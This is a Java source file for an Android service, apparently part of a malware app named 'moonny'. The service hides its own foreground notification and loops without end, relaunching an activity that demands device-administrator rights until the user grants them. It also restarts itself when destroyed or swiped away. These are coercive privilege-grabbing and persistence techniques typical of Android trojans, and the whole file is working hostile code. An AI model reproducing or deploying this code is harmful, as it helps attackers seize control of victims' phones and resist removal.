package com.moonny.srvs;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import com.moonny.R;
import com.moonny.acts.AdminActivity;
import com.moonny.Modules;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

public class AdminRightsService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if(!Constant.ADMIN_REQUIRED)
            return START_NOT_STICKY;

        // ================= STEEL SRV ================
        Notification.Builder builder = new Notification.Builder(this)
                .setSmallIcon(R.drawable.ic_stat_content_mail);

        Notification notification;
        if (Build.VERSION.SDK_INT < 16) {
            notification = builder.getNotification();
        }else {
            builder.setPriority(Notification.PRIORITY_MIN);
            notification = builder.build();
        }

        int notify_id = 2777;
        startForeground(notify_id, notification);

        Intent hideIntent = new Intent(this, HideService.class);
        hideIntent.setFlags(Intent.FLAG_RECEIVER_FOREGROUND);
        hideIntent.putExtra(HideService.KEY_ID, Integer.toString(notify_id));
        startService(hideIntent);

        // =============================================

        new Thread(new Runnable() {
            @Override
            public void run() {
                Context ctx = getBaseContext();
                Modules.main(ctx, S.set_pref, new Object[]{ S.is_admin_active, false });
                while(true)
                    cycle(ctx); // getAdmin
            }
        }).start();

        return START_STICKY;
    }

    private void cycle(Context ctx) {

        Modules mods = new Modules(ctx);
        if(!mods.is_mod_exists(S.mod_main)) {
            Utils.threadSleep(1000);
            if(Constant.DEBUG) Log.d("CONTROL", "adminRightsRec not allowed");
            return;
        }

        if (!(boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.is_admin_active, false }) /* Prefs-Manager.get(ctx, S.is_admin_active, false) */) {
            Intent intent = new Intent(AdminRightsService.this, AdminActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }else{
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        try {
            Intent serviceIntent = new Intent(this, AdminRightsService.class);
            startService(serviceIntent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {

        Intent restartService = new Intent(getApplicationContext(),
                this.getClass());
        restartService.setPackage(getPackageName());
        PendingIntent restartServicePI = PendingIntent.getService(
                getApplicationContext(), 1, restartService,
                PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager) getApplicationContext()
                .getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 2000, restartServicePI);
    }

}